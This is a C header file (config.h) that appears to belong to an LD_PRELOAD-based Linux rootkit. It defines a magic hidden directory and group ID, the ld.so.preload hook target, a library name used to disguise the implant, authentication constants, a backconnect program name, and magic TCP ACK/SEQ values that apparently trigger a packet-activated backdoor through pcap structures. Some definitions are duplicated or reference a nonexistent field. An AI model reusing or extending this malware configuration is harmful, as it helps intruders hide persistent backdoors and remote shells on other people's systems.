#ifndef CONFIG_H
#define CONFIG_H

#define MAGIC_DIR "xochi"
#define MAGIC_GID 90
#define CONFIG_FILE "ld.so.preload"
#define HIDE "libc.so.6"

#define AUTH 0x634a5cb4
#define HTUA 0x3ff3876f

#define APP_NAME "bc"
#define MAGIC_ACK 0xdead
#define MAGIC_SEQ 0xbeef

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <limits.h>
#include <errno.h>
#include <linux/in.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>


//#define DEBUG
typedef struct pcap pcap_t;

typedef	int bpf_int32;
typedef	u_int bpf_u_int32;

// struct pcap_pkthdr {
// 	struct timeval ts;	/* time stamp */
// 	bpf_u_int32 caplen;	/* length of portion present */
// 	bpf_u_int32 len;	/* length this packet (off wire) */
// };

// typedef void (*pcap_handler)(u_char *, const struct pcap_pkthdr *,
// 			     const u_char *);

typedef struct pcap_pkthdr dp_header;
typedef int (*dp_callback)(u_char *, const dp_header *, const u_char *);

				 
enum dp_packet_type {
  dp_packet_ethernet,
  dp_packet_ppp,
  dp_packet_sll,
  dp_packet_ip,
  dp_packet_ip6,
  dp_packet_tcp,
  dp_packet_udp,
  dp_n_packet_types
};

struct dp_handle {
  pcap_t *pcap_handle;
  dp_callback callback[dp_n_packet_types];
  int linktype;
  u_char *userdata;
  int userdata_size;
};


typedef struct pcap_pkthdr dp_header;
typedef int (*dp_callback)(u_char *, const dp_header *, const u_char *);

typedef struct in_addr_
{
    in_addr_t s_addr;
}in_addr;

typedef struct in6_addr_
{
  union
  {
    uint8_t		u6_addr8[16];
    uint16_t	u6_addr16[8];
    uint32_t	u6_addr32[4];
  } in6_u;
  #define s6_addr			in6_u.u6_addr8
  #define s6_addr16		in6_u.u6_addr16
  #define s6_addr32		in6_u.u6_addr32
  #define s6_addr64		in6_u.u6_addr64
  }in6_addr;


struct dpargs {
  const char *device;
  int sa_family;
  in_addr ip_src;
  in_addr ip_dst;
  in6_addr ip6_src;
  in6_addr ip6_dst;
};

struct control {
	unsigned short cmd;
	void *argv;
};

#ifdef DEBUG
	#define debug printf
#else
	#define debug
#endif




#endif
